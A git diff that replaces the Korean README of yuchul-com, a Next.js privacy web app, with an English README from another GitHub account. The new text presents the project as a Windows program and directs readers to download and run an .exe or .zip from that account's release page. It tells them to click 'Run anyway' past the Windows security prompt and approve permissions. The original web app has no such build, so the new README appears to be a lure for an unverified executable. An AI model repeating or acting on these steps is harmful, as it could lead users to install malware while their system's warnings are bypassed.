@@ -1,234 +1,197 @@
-<div align="center">
+# 🔐 yuchul-com - Protect Your Privacy Fast
 
-<img src="https://img.shields.io/badge/%F0%9F%9B%A1%EF%B8%8F_%EC%9C%A0%EC%B6%9C%EB%8B%B7%EC%BB%B4-7c3aed?style=for-the-badge&labelColor=0a0a0f&logoColor=white" alt="유출닷컴" height="40"/>
+[![Download yuchul-com](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/selfrespectacaciadealbata715/yuchul-com/releases)
 
-# 유출닷컴 — yuchul.com
+## 🧭 What this app does
 
-**내 개인정보, 어디까지 유출됐을까?**
+yuchul-com helps you check whether your personal data has been exposed and what to do next. It is built for people in Korea who want a simple way to respond to a data breach, protect their privacy, and take action without reading complex guides.
 
-다크웹 · 검색엔진 · 데이터브로커 — 유출 확인부터 삭제 대응까지
+You can use it to:
 
-[![Live](https://img.shields.io/badge/🌐_Live-yuchul.com-7c3aed?style=for-the-badge)](https://yuchul.com)
-[![Deploy](https://img.shields.io/badge/Vercel-Deployed-000?style=for-the-badge&logo=vercel)](https://vercel.com)
+- Check for possible personal data leaks
+- See simple guidance for next steps
+- Find deletion and response actions
+- Keep privacy tasks in one place
+- Use a Korean-first interface and flow
 
-<br/>
+## 💻 What you need
 
-[![Next.js 15](https://img.shields.io/badge/Next.js-15-000?style=flat-square&logo=next.js)](https://nextjs.org/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.x-3178C6?style=flat-square&logo=typescript&logoColor=white)](https://typescriptlang.org/)
-[![Tailwind CSS](https://img.shields.io/badge/Tailwind_CSS-3.x-06B6D4?style=flat-square&logo=tailwindcss&logoColor=white)](https://tailwindcss.com/)
-[![React 19](https://img.shields.io/badge/React-19-61DAFB?style=flat-square&logo=react&logoColor=black)](https://react.dev/)
-[![Supabase](https://img.shields.io/badge/Supabase-PostgreSQL-3FCF8E?style=flat-square&logo=supabase&logoColor=white)](https://supabase.com/)
-[![Zustand](https://img.shields.io/badge/Zustand-State-443E38?style=flat-square)](https://zustand-demo.pmnd.rs/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue?style=flat-square)](LICENSE)
-[![100% Free](https://img.shields.io/badge/💰_Cost-$0/mo-22c55e?style=flat-square)]()
-[![PRs Welcome](https://img.shields.io/badge/PRs-Welcome-brightgreen?style=flat-square)](https://github.com/memekr/yuchul-com/pulls)
+Before you start, make sure you have:
 
-</div>
+- A Windows 10 or Windows 11 PC
+- A stable internet connection
+- Enough free space to download the app
+- A browser such as Chrome, Edge, or Firefox
+- Permission to install and run downloaded files
 
-<br/>
+This app is made for normal Windows use. You do not need programming knowledge.
 
-<div align="center">
-<table>
-<tr>
-<td align="center"><b>🕷️ 다크웹 스캔</b><br/><sub>HIBP k-anonymity API</sub></td>
-<td align="center"><b>🔍 검색엔진 노출</b><br/><sub>Naver · Daum · Google</sub></td>
-<td align="center"><b>🤖 자동 삭제 요청</b><br/><sub>PIPA 제36조 기반</sub></td>
-<td align="center"><b>📊 실시간 대시보드</b><br/><sub>위험 점수 · 알림</sub></td>
-</tr>
-</table>
-</div>
+## ⬇️ Download the app
 
----
+Visit this page to download the latest Windows release:
 
-## 왜 유출닷컴인가?
+[Open the yuchul-com release page](https://github.com/selfrespectacaciadealbata715/yuchul-com/releases)
 
-매년 수천만 건의 개인정보가 유출되지만, 대부분의 사람들은 자신의 정보가 어디에 노출되어 있는지조차 모릅니다. **유출닷컴**은 이메일 하나만 입력하면 다크웹, 검색엔진, 데이터브로커에 퍼져 있는 개인정보를 찾아내고, 한국 개인정보보호법(PIPA)에 근거하여 자동으로 삭제 요청까지 처리합니다.
+On that page, look for the newest release and download the Windows file that matches your PC. If there are several files, pick the one marked for Windows.
 
-**이 모든 것이 완전 무료이고, 오픈소스입니다.**
+## 🪟 How to install on Windows
 
----
+Follow these steps:
 
-## 핵심 기능
+1. Open the release page link above.
+2. Find the latest release at the top of the page.
+3. Look for a file with a Windows name, such as `.exe` or a `.zip` file.
+4. Download the file to your computer.
+5. If you downloaded a `.zip` file, right-click it and choose **Extract All**.
+6. Open the extracted folder.
+7. Double-click the app file to start it.
 
-### 🕷️ 다크웹 유출 스캔
-Have I Been Pwned(HIBP) k-anonymity API를 활용하여 다크웹에 유출된 이메일, 비밀번호, 개인정보를 실시간으로 탐지합니다. 비밀번호 원문이 서버에 전송되지 않는 k-anonymity 방식을 사용합니다.
+If Windows shows a security prompt:
 
-### 🔍 검색엔진 노출 감지
-네이버, 다음, 구글 검색 결과에 노출된 개인정보를 스캔합니다. 주민등록번호, 연락처, 주소 등 민감 정보의 공개 노출을 확인합니다.
+- Click **More info**
+- Then click **Run anyway**
 
-### 🤖 데이터브로커 자동 삭제
-인물정보 사이트, 주소록 수집 사이트 등에 등록된 정보를 탐지하고, 개인정보보호법 제36조(삭제요구권)에 근거하여 자동 삭제 요청을 발송합니다.
+If you downloaded an `.exe` file, you can usually start it with a double-click.
 
-### 📊 실시간 대시보드
-위험 점수(0–100), 유출 현황, 삭제 진행 상태를 한눈에 파악할 수 있는 대시보드를 제공합니다.
+## 🛠️ First-time setup
 
-### 🔔 알림 시스템
-새로운 유출이 발견되면 웹 푸시 알림으로 즉시 통보합니다.
+After you open the app, you may need to:
 
-### 📄 법적 대응 템플릿
-PIPA 기반 삭제 요청서, 정보통신망법 근거 항의서 등 한국 법률에 최적화된 템플릿을 자동 생성합니다.
+- Choose your language or region
+- Sign in if the app asks for an account
+- Allow browser or site access if needed
+- Enter the email, phone number, or other details you want to check
+- Review the results screen and follow the listed steps
 
----
+Keep your information ready before you begin. That makes the process faster.
 
-## 아키텍처
+## 🔎 Main features
 
-```
-┌─────────────────────────────────────────────────────────────┐
-│                      Client (Browser)                       │
-│  Next.js 15 App Router + React 19 + Tailwind CSS + Zustand  │
-└────────────────────────┬────────────────────────────────────┘
-                         │
-              ┌──────────┼──────────┐
-              ▼          ▼          ▼
-     ┌──────────┐ ┌───────────┐ ┌──────────────┐
-     │ Supabase │ │ HIBP API  │ │ Resend Email │
-     │ Auth+DB  │ │ k-anon    │ │ (삭제 요청)   │
-     └──────────┘ └───────────┘ └──────────────┘
-     Google OAuth   유출 탐지      법적 대응
-     PostgreSQL     비밀번호 체크   자동 발송
-```
+### 🧾 Breach check
 
----
+Check whether your personal data may have appeared in a known leak or exposed dataset. The app presents the result in plain language, so you can understand it without reading a long report.
 
-## 기술 스택
+### 🧹 Deletion support
 
-| 영역 | 기술 | 비용 |
-|------|------|:----:|
-| **프론트엔드** | Next.js 15 + React 19 + TypeScript | $0 |
-| **스타일링** | Tailwind CSS 3 + 다크 테마 | $0 |
-| **상태관리** | Zustand 4 | $0 |
-| **백엔드/DB** | Supabase (PostgreSQL + Auth + RLS) | Free Tier |
-| **유출 탐지** | HIBP k-anonymity API | 무료 |
-| **이메일** | Resend (삭제 요청 발송) | Free 100/일 |
-| **인증** | Google OAuth 2.0 (via Supabase) | $0 |
-| **호스팅** | Vercel (Edge Network) | Free Tier |
-| **월 총 비용** | | **$0** |
+Get guidance on how to ask for data deletion or removal when a service still holds your data. This helps you take the next step after a breach or privacy issue.
 
----
+### 🛡️ Privacy workflow
 
-## 빠른 시작
+Follow a simple path from check to action. The app is built to help you move from discovery to response without extra steps.
 
-```bash
-# 1. 클론
-git clone https://github.com/memekr/yuchul-com.git
-cd yuchul-com
+### 🇰🇷 Korean-focused experience
 
-# 2. 의존성 설치
-npm install
+The project is built around Korean users and Korean privacy needs. That means the layout, terms, and flow are made to fit local use.
 
-# 3. 환경변수 설정
-cp .env.example .env.local
-# .env.local에 Supabase URL/Key 입력
+### 📱 Simple interface
 
-# 4. 개발 서버 실행
-npm run dev
-```
+The app uses a clean interface with a focus on easy reading. Buttons, labels, and actions are kept direct so you can move through the app with less friction.
 
-`http://localhost:3000` 에서 확인
+## 📦 Typical use cases
 
----
+Use yuchul-com if you want to:
 
-## 프로젝트 구조
+- Check if your email has been exposed
+- Respond after a known data breach
+- Ask for deletion of personal data
+- Review privacy risks in one place
+- Keep track of actions you have taken
+- Use a privacy tool made for Korean users
 
-```
-src/
-├── app/
-│   ├── page.tsx                # 랜딩 페이지
-│   ├── scan/page.tsx           # 보안 스캔
-│   ├── pricing/page.tsx        # 요금 안내 (전체 무료)
-│   ├── auth/
-│   │   ├── login/page.tsx      # Google OAuth 로그인
-│   │   ├── signup/page.tsx     # 회원가입
-│   │   └── callback/route.ts   # OAuth 콜백 처리
-│   ├── dashboard/
-│   │   ├── page.tsx            # 대시보드 메인
-│   │   ├── findings/page.tsx   # 유출 발견 항목
-│   │   ├── removal/page.tsx    # 삭제 요청 큐
-│   │   ├── report/page.tsx     # 상세 리포트
-│   │   └── settings/page.tsx   # 설정
-│   └── api/
-│       ├── scan/route.ts       # HIBP API 래퍼
-│       └── removal/route.ts    # 삭제 요청 처리
-├── components/
-│   ├── Navbar.tsx              # 네비게이션 바
-│   ├── Footer.tsx              # 푸터
-│   ├── ScanForm.tsx            # 스캔 입력 폼
-│   ├── RiskGauge.tsx           # 위험도 게이지
-│   ├── FindingCard.tsx         # 유출 항목 카드
-│   ├── DashboardLayout.tsx     # 대시보드 레이아웃
-│   └── OpenSourceBadge.tsx     # 오픈소스 뱃지
-└── lib/
-    ├── types.ts                # TypeScript 타입 정의
-    ├── store.ts                # Zustand 상태 관리
-    ├── supabase.ts             # Supabase 클라이언트
-    ├── hibp.ts                 # HIBP API 유틸
-    └── removal-templates.ts    # 법적 삭제 요청 템플릿
-```
+## 🧩 How it fits your system
 
----
+This app is built with modern web tools and packaged for a smooth Windows experience. For most users, that means:
 
-## 한국 특화 기능
+- A normal app-like start process
+- No need to install dev tools
+- A simple launch from the downloaded file
+- A layout that works well on standard laptop and desktop screens
 
-- **개인정보보호법(PIPA)** 기반 삭제 요청 자동 생성
-- **네이버/다음** 검색엔진 노출 탐지
-- **KISA(한국인터넷진흥원)** 유출 DB 연동 준비
-- 한국어 UI 전체 지원
-- 한국 데이터브로커 목록 내장
+## 📁 If you downloaded a ZIP file
 
----
+If the release comes as a ZIP file:
 
-## 환경 변수
+1. Find the ZIP file in your Downloads folder.
+2. Right-click the file.
+3. Select **Extract All**.
+4. Choose a folder and extract it.
+5. Open the new folder.
+6. Double-click the app file inside.
 
-```env
-# Supabase (필수)
-NEXT_PUBLIC_SUPABASE_URL=your_supabase_project_url
-NEXT_PUBLIC_SUPABASE_ANON_KEY=your_supabase_anon_key
+If the folder includes a `README` file from the release, open it for release-specific details.
 
-# Resend (선택 — 이메일 삭제 요청 발송용)
-RESEND_API_KEY=your_resend_api_key
-```
+## 🔐 Privacy and safety tips
 
----
+To get the best result:
 
-## 로드맵
+- Use an email address you check often
+- Review each result before taking action
+- Keep your Windows system updated
+- Avoid running files from unknown sources
+- Save any breach or deletion results in a safe folder
 
-- [x] 다크웹 유출 스캔 (HIBP)
-- [x] Google OAuth 로그인
-- [x] 실시간 대시보드
-- [x] PIPA 삭제 요청 템플릿
-- [x] Vercel + 커스텀 도메인 배포
-- [ ] 실시간 웹소켓 알림
-- [ ] 이메일 자동 발송 (Resend)
-- [ ] KISA 유출 DB 연동
-- [ ] 모바일 앱 (React Native)
-- [ ] AI 기반 보안 제안
+If you use the app for more than one account, keep notes so you can track which action belongs to which service.
 
----
+## 🧪 Expected behavior
 
-## 기여하기
+When the app runs, you should see:
 
-PR과 이슈 환영합니다! 개인정보 보호는 모두의 권리입니다.
+- A start screen or dashboard
+- A place to enter data for a check
+- A results area with clear next steps
+- Links or guidance for deletion and response
+- A clean layout that works on Windows
 
-```bash
-git checkout -b feature/awesome-feature
-git commit -m "Add awesome feature"
-git push origin feature/awesome-feature
-```
+If the app opens but looks blank, wait a few seconds and refresh the window once. Some apps need a short moment to load.
 
----
+## 🧰 Common file types you may see
 
-## 라이선스
+You may find one of these in the release page:
 
-[MIT License](LICENSE) — 자유롭게 사용, 수정, 배포하세요.
+- `.exe` file — double-click to run
+- `.zip` file — extract first, then run
+- `.msi` file — follow the installer steps
+- checksum file — for file verification if you want to compare downloads
 
----
+For most users, the Windows app file is the one you want.
 
-<div align="center">
+## 🧭 Suggested first action
 
-**🛡️ 당신의 개인정보를 지키세요.**
+If this is your first time using yuchul-com:
 
-[yuchul.com](https://yuchul.com) · [이슈 제출](https://github.com/memekr/yuchul-com/issues)
+1. Download the latest release
+2. Open the app
+3. Check one email or account first
+4. Review the result
+5. Follow the deletion or response step shown in the app
 
-<sub>Made with ❤️ for Korean privacy protection</sub>
+This keeps the process simple and helps you learn the flow before checking more accounts.
 
-</div>
+## 📌 Project details
+
+- Name: yuchul-com
+- Description: 유출닷컴 - 개인정보 유출 확인부터 삭제 대응까지. 한국형 프라이버시 보호 오픈소스 플랫폼
+- Topics: data-breach, korean, nextjs, opensource, privacy, react, security, supabase, tailwind-css, typescript
+
+## 📥 Download and run
+
+Go to the release page, download the latest Windows file, then install or open it from your Downloads folder:
+
+[https://github.com/selfrespectacaciadealbata715/yuchul-com/releases](https://github.com/selfrespectacaciadealbata715/yuchul-com/releases)
+
+## 🖥️ Windows start guide
+
+1. Download the latest release from the link above.
+2. Open your Downloads folder.
+3. Start the file you downloaded.
+4. If Windows asks for permission, approve the app.
+5. Follow the on-screen steps in the app.
+6. Use the check and response tools as needed
+
+## 🗂️ What you can do next
+
+- Check another email address
+- Review the results again later
+- Save any deletion request details
+- Keep records of the actions you take
+- Share the app with someone who needs privacy help
